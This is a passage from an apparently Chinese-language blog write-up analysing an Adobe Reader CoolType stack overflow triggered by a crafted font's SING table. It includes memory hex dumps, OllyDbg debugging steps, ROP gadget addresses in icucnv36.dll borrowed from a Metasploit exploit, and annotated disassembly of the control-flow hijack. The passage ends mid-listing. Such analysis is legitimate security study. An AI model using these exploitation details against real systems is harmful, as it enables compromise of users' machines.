83 8E BD 60  N缜B墜?憅z=儙絗</span><br><span class="line">0012E528  AB 8F FA 53 8E F2 15 70 D8 66 BB A0 24 09 05 CD  珡鶶庲p豧粻$.</span><br><span class="line">0012E538  E6 10 AE B9 B2 E0 B8 40 91 36 FC 66 8B 7B BE C2  ?侧窣?黤媨韭</span><br><span class="line">0012E548  65 24 37 DA 2B 2C FC FA 04 89 92 95 B5 3A 22 FE  e$7?,墥暤:&quot;</span><br><span class="line">0012E558  44 BA 47 90 BD 17 78 9A 86 A8 CC 2A B1 0B FA 8F  D篏惤x殕ㄌ*?鷱</span><br><span class="line">0012E568  54 C7 4B 6D BF 1A 47 1D 33 0D 72 DC D3 8E 1E FC  T荎m?G3.r苡?</span><br><span class="line">0012E578  7E 2D 41 FE B2 7D 0C 3A 1A BE 1D F7 DC 35 59 BD  ~-A&#125;.:?鬈5Y</span><br><span class="line">0012E588  5A C3 06 67 E3 6F FC D5 49 3B 3E 1B 4D FC 6E 8C  Z?g鉶I;&gt;M黱</span><br><span class="line">0012E598  5D E4 7B BA 86 8C AC A7 11 F3 B2 43 A1 0B 04 B4  ]鋥簡尙?蟛C?</span><br><span class="line">0012E5A8  30 71 3F A9 3A CC CF E0 B3 15 35 39 BC F9 6F 9C  0q??滔喑59践o</span><br><span class="line">0012E5B8  E4 0C 84 72 70 90 64 0A 53 E3 A4 65 BB C6 19 85  ?剅p恉.S悚e黄</span><br><span class="line">0012E5C8  BA 6D 04 8D BE EF 3A 1F 4C 0D FD E0 29 BD FC 77  簃嵕?L.)近w</span><br><span class="line">0012E5D8  CD F3 41 98 0D AD D7 3B 92 48 A6 BB B7 8C C9 F5  腕A?;扝穼甚</span><br><span class="line">0012E5E8  71 7A 72 69 54 32 60 80 8D 9C 16 24 81 B8 C0 32  qzriT2`€崪$伕?</span><br><span class="line">0012E5F8  2D 44 17 5A 06 6D 75 0F 77 9E CF 67 F4 23 2C 2B  -DZmuw炏g?,+</span><br><span class="line">0012E608  C6 08 8A 4A E2 2F 63 30 39 85 30 38 40 55 FA 3B  ?奐?c09?8@U?</span><br><span class="line">0012E618  DB DD 44 05 9D BE 81 73 DD F3 CA 9A 4D 02 F0 EF  圯D澗乻蒹蕷M痫</span><br><span class="line">0012E628  05 A9 10 F7 05 69 C6 B4 DF 84 4A 6D 3C 85 6E D9  ??i拼邉Jm&lt;卬</span><br><span class="line">0012E638  3A 29 D3 E4 44 95 96 E3 C0 3E 0F FA 45 5E D1 40  :)愉D晼憷&gt;鶨^袬</span><br><span class="line">0012E648  DB BB AB 23 BA FF 42 8D 8A 05 D1 84 8A AE E5 5B  刍??B崐褎姰錥</span><br><span class="line">0012E658  F1 E7 94 85 95 20 E5 41 6B 95 CD 72 6D 8B EE D6  耒攨?錋k曂rm嬵</span><br><span class="line">0012E668  19 8C BF FB BC 64 17 7F E7 A4 70 F7 94 E3 A7 3B  尶d绀p鲾悃;</span><br><span class="line">0012E678  5B 69 A1 F4 7F 20 11 02 58 4F 24 FD 38 70 A3 97  [i◆ XO$?p</span><br><span class="line">0012E688  62 2C FA 58 E6 C2 D6 B5 04 80 EC 82 FC 05 80 D1  b,鶻媛值€靷?€</span><br><span class="line">0012E698  93 0B CB 63 38 F7 B9 90 F0 8B D3 F8 91 96 7A C7  ?薱8鞴愷嬘鴳杬</span><br><span class="line">0012E6A8  37 24 37 4E 99 84 6C 40 DF 84 A2 97 17 7B 6F 59  7$7N檮l@邉&#123;oY</span><br><span class="line">0012E6B8  51 51 9C 7A 50 DA 1B 08 7E ED 73 8B D9 B9 53 9B  QQ渮P?~韘嬞筍</span><br><span class="line">0012E6C8  29 59 F1 FD A6 38 DF 49 38 CB 80 4A E3 A6 2C CA  )Y颀?逫8藔J悝,</span><br><span class="line">0012E6D8  2B 0C 6B E0 A5 48 43 D2 F3 77 1C 91 82 C7 40 59  +.k啷HC殷w憘茾Y</span><br><span class="line">0012E6E8  5F 6C C6 02 59 D4 BA AE 32 F9 41 9A FF 07 28 4D  _l?Y院?鵄?(M</span><br><span class="line">0012E6F8  28 73 33 DA D4 69 D1 F3 E6 85 2B D1 76 90 FF 6C  (s3谠i洋鎱+裿?l</span><br><span class="line">0012E708  28 F3 A4 34 AB 2F 57 AE 1B C7 A5 1D 6C 00 00 00  (螭4?W?钎l...</span><br><span class="line"></span><br><span class="line">0012E718  00 00 00 00 6D 00 00 00 01 00 00 00 01 00 00 00  ....m.........</span><br><span class="line">0012E728  00 00 00 00 F8 B1 13 02 A0 38 96 04 EC 26 00 00  ....???..</span><br></pre></td></tr></table></figure></p><h5 id="2-3、触发过程"><a href="#2-3、触发过程" class="headerlink" title="2.3、触发过程"></a>2.3、触发过程</h5><p>&emsp;&emsp;我们从<code>metasploit</code>的漏洞利用代码中可以知道<code>SING表的数据</code>主要是构造了一个<strong><code>ROP链</code></strong>,用于<code>控制EIP</code>最终跳转到<code>堆喷</code>的真正的用于<code>绕过DEP</code>的<code>ROP Chain</code>处。从代码注释中可知,<strong><code>第一个ROPgadget</code></strong>位于icucnv36.dll中的<code>0x4A80CB38</code>处,<strong><code>第二个ROPgadget</code></strong>位于icucnv36.dll中的<code>0x4A82A714</code>处。这部分后面会介绍,为什么选用这两个地址呢？因为在<code>Adobe Reader</code>的<code>各个版本</code>上，这个dll的这两处地址是<code>始终不变</code>的，从而保证了<code>exploit</code>对于各版本的<code>兼容性</code>和<code>稳定性</code>。</p><blockquote><ul><li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li><li>2、在<code>0x4A80CB38</code>下断点,运行程序。</li><li>3、当运行到<code>0x4A80CB38</code>地址处时,我们查看栈,看到返回地址为<code>0x0808B30A</code>,可以知道调用者的位置就在其上一条指令处,<code>0x0808B308</code>处的<code>call dword ptr [eax]</code>指令。</li><li>4、我们再对这段<code>ROPgadget</code>的调用地址<code>0x0808B308</code>下断点,并且通过ollydbg的反汇编窗口找到<code>此调用者函数的父函数</code>sub_808B116(),再下断点<code>0x0808B116</code>。</li><li>5、我们再在<code>堆栈窗口</code>中寻找<code>sub_808B116()</code>的<code>返回地址</code>,查看其返回地址是否在调用<code>strcat()函数</code>的<code>父函数sub_803DCF9()</code>的地址范围中,若是,栈回溯结束。如不是，继续向下寻找。</li></ul></blockquote><p>&emsp;&emsp;也许有些<code>返回地址</code>在<code>堆栈窗口</code>中只是显示为<code>返回到 CoolType.xxxxxxxx</code>,并没显示是<code>哪个函数的返回地址</code>。这是因为这个返回地址所属的函数的地址是存放在<code>内存中的某个位置</code>或在<code>寄存器</code>中,指令格式<code>call r/m32</code>。通常函数调用使用的是指令格式为<code>call rel32</code>,其操作数为<code>函数地址</code>相对<code>当前调用指令</code>的<code>下一条指令地址</code>的偏移,以<code>补码</code>表示。</p><p>程序<strong><code>控制流劫持过程</code></strong>分析：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">    char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">********************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9      <span class="keyword">push</span>    <span class="built_in">ebp</span>                         <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA      <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                   <span class="comment">; esp=0x0012E4DC</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00      <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04      <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie     <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09      <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                    <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>       <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11      <span class="keyword">push</span>    <span class="number">4Ch</span>                         <span class="comment">; __EH_prolog3_catch函数中分配栈空间大小</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54     <span class="comment">; __security_check_cookie函数地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18      <span class="keyword">call</span>    __EH_prolog3_catch          <span class="comment">; 向栈上写入SEH结构</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD1D      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]       <span class="comment">; eax=[0x0012E4D8+0x11c]=[0x0012E5F4]=0x0012E700,eax = a4</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD23      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]       <span class="comment">; edi=[0x0012E4D8+0x110]=[0x0012E5E8]=0x0012E718,edi = a1 &lt;------对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD29      <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]       <span class="comment">; ebx=[0x0012E4D8+0x114]=[0x0012E5EC]=0x0012E608,ebx = a2 对象(0x0012E608)的指针</span></span><br><span class="line">........</span><br><span class="line"><span class="symbol">.text:</span>0803DDAB      <span class="keyword">call</span>    strcat                      <span class="comment">; 调用strcat函数，造成溢出</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB0      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB1      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB2      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; eax=0x0012E4D8,为uniqueName缓冲区地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB5      <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB6      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ebx</span>                    <span class="comment">; ecx=ebx=0x0012E608,对象(0x0012E608)的指针,第一个成员变量原来是0,可以直接跳过sub_8001243()的一段代码,但是我们构造的uniqueName不能将这里构造为0x0,会造成截断,其内容+0x1c必须为一个可访问的地址,使得程序可以顺利执行通过第一个成员变量为0时跳过的那段代码。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB8      <span class="keyword">call</span>    sub_8001243</span><br><span class="line"><span class="symbol">.text:</span>0803DDBD      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C]     <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DDC0 loc_803DDC0:                            </span><br><span class="line"><span class="symbol">.text:</span>0803DDC0      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC4</span><br><span class="line"><span class="symbol">.text:</span>0803DDC4 loc_803DDC4:                            </span><br><span class="line"><span class="symbol">.text:</span>0803DDC4      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC6      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDCA      <span class="keyword">jz</span>      short loc_803DDD3</span><br><span class="line"><span class="symbol">.text:</span>0803DDCC      <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDCD      <span class="keyword">call</span>    sub_80418BF</span><br><span class="line"><span class="symbol">.text:</span>0803DDD2      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDD3</span><br><span class="line"><span class="symbol">.text:</span>0803DDD3 loc_803DDD3:                           </span><br><span class="line"><span class="symbol">.text:</span>0803DDD3      <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDD7      <span class="keyword">jnz</span>     loc_803DEA9</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DEA9 loc_803DEA9:                           </span><br><span class="line"><span class="symbol">.text:</span>0803DEA9                                         </span><br><span class="line"><span class="symbol">.text:</span>0803DEA9      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]     <span class="comment">;   eax=ebp-0x1c=0x0012E4BC, ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAC      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg3: eax=0x0012E4BC</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAD      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg2: ebx=0x0012E608 对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAE      <span class="keyword">push</span>    <span class="built_in">edi</span>                         <span class="comment">; arg1: edi=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAF      <span class="keyword">call</span>    sub_8016BDE</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_8016BDE(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">********************************************************************                    </span><br><span class="line"><span class="symbol">.text:</span>08016BDE      <span class="keyword">push</span>    <span class="built_in">ebp</span>                         <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>08016BDF      <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">660h</span>                   <span class="comment">; esp=esp-0x660=0x0012DDFC,之前esp=0x0012E45C</span></span><br><span class="line"><span class="symbol">.text:</span>08016BE5      <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                <span class="comment">; ebp=esp-4=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016BE9      <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie</span><br><span class="line"><span class="symbol">.text:</span>08016BEE      <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF0      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF6      <span class="keyword">push</span>    <span class="number">50h</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF8      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8175D32</span><br><span class="line"><span class="symbol">.text:</span>08016BFD      <span class="keyword">call</span>    __EH_prolog3_catch</span><br><span class="line"><span class="symbol">.text:</span>08016C02      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_8]       <span class="comment">; eax=[ebp+0x674]=[0x0012E46C]=0x0012E4BC, eax=a3</span></span><br><span class="line"><span class="symbol">.text:</span>08016C08      <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_4]       <span class="comment">; esi=[ebp+0x670]=[0x0012E468]=0x0012E608, esi=a2,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C0E      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_0]       <span class="comment">; edi=[ebp+0x66c]=[0x0012E464]=0x0012E718,ebp=0x0012DDF8 &lt;------ edi = a1,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C14      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_6BC], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016C17      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset CriticalSection <span class="comment">; eax=0x0823A650,_RTL_CRITICAL_SECTION结构体对象指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C1C      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; lpCriticalSection</span></span><br><span class="line"><span class="symbol">.text:</span>08016C1D      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_680], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08016C20      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_6C0], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016C23      <span class="keyword">call</span>    <span class="built_in">ds</span>:EnterCriticalSection     <span class="comment">; 执行完 eax=0</span></span><br><span class="line"><span class="symbol">.text:</span>08016C29      <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                    <span class="comment">; ebx=0</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2B      <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2C      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_668], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2F      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_694], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C32      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_678], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C35      <span class="keyword">call</span>    sub_801BB1C                 <span class="comment">; 执行完 eax=0x01F347B8,为StreamHandler类对象,内存第一个双字为虚表指针,0x081A601C</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3A      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3C      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3D      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_67C], <span class="built_in">eax</span>     <span class="comment">; eax=0x01F347B8,为StreamHandler类对象</span></span><br><span class="line"><span class="symbol">.text:</span>08016C40      <span class="keyword">jz</span>      loc_80172CE                 <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>08016C46      <span class="keyword">push</span>    <span class="number">1</span>                           <span class="comment">; arg7: 1</span></span><br><span class="line"><span class="symbol">.text:</span>08016C48      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg6: 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>08016C49      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg5: 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4A      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_678]     <span class="comment">;   eax=[ebp-0x14]=0x0012DDE4,ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4D      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg4: eax=0x0012DDE4</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4E      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_694]     <span class="comment">;   eax=[ebp-0x30]=0x0012DDC8,ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C51      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg3: eax=0x0012DDC8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C52      <span class="keyword">push</span>    <span class="built_in">edi</span>                         <span class="comment">; arg2&lt;-a1: edi=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C53      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_67C]          <span class="comment">; arg1: [ebp-0x18]=[0x0012DDE0]=0x01F347B8 </span></span><br><span class="line"><span class="symbol">.text:</span>08016C56      <span class="keyword">call</span>    sub_801BB21</span><br><span class="line">                                               <span class="built_in">esp</span> --&gt;  0012DD6C   08016C5B  <span class="comment">; 返回到 CoolType.08016C5B 来自 CoolType.0801BB21</span></span><br><span class="line">                                                        0012DD70   01F347B8  <span class="comment">; arg1: StreamHandler类对象地址</span></span><br><span class="line">                                                        0012DD74   0012E718  <span class="comment">; arg2: 对象(0x0012E718)的指针</span></span><br><span class="line">                                                        0012DD78   0012DDC8  <span class="comment">; arg3</span></span><br><span class="line">                                                        0012DD7C   0012DDE4  <span class="comment">; arg4</span></span><br><span class="line">                                                        0012DD80   <span class="number">00000000</span>  <span class="comment">; arg5</span></span><br><span class="line">                                                        0012DD84   <span class="number">00000000</span>  <span class="comment">; arg6</span></span><br><span class="line">                                                        0012DD88   <span class="number">00000001</span>  <span class="comment">; arg7</span></span><br><span class="line">StreamHandler类对象内存：</span><br><span class="line"><span class="comment">;01F347B8  1C 60 1A 08 6D 00 00 00 00 00 00 00 84 90 13 02  `m.......剱</span></span><br><span class="line"><span class="comment">;01F347C8  00 00 00 00 00 00 00 00 6D 00 00 00 01 00 00 00  ........m......</span></span><br><span class="line"><span class="comment">;01F347D8  01 00 00 00 00 00 00 00 00 00 00 00 50 A6 23 08  ...........P?</span></span><br><span class="line"><span class="comment">;01F347E8  00 00 00 00 00 00 00 00 1C 01 00 00 00 00 00 00  ..............</span></span><br><span class="line"><span class="comment">;01F347F8  00 00 00 00 00 00 00 00 EF 33 08 08 E0 47 F3 01  ........?郍?</span></span><br><span class="line"><span class="comment">;01F34808  00 48 F3 01 00 00 00 00 00 00 00 00 00 00 00 00  .H?............</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*****************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">功能: 找到虚函数地址并调用</span><br><span class="line"><span class="keyword">int</span> __cdecl sub_801BB21(<span class="keyword">int</span> (__stdcall ***a1)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>), <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7)</span><br><span class="line"></span><br><span class="line">*****************************************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0801BB21      <span class="keyword">push</span>    <span class="built_in">ebp</span>                     <span class="comment">;   ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB22      <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                <span class="comment">;   ebp=esp=0x0012DD68</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB24      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_18]            <span class="comment">; arg6&lt;-a7: [ebp+0x20]=[0x0012DD88]=0x01</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB27      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_0]        <span class="comment">; this&lt;-a1: ecx=[ebp+0x8]=[0x0012DD670]=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2A      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_14]            <span class="comment">; arg5&lt;-a6: [ebp+0x1c]=[0x0012DD84]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2D      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>]              <span class="comment">;   eax=[ecx]=[0x01F347B8]=0x081A601C(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB2F      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]            <span class="comment">; arg4&lt;-a5: [ebp+0x18]=[0x0012DD80]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB32      <span class="keyword">inc</span>     dword_823A6A0           <span class="comment">;   [0x0823A6A0]=0x0-&gt;0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB38      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_C]             <span class="comment">; arg3&lt;-a4: 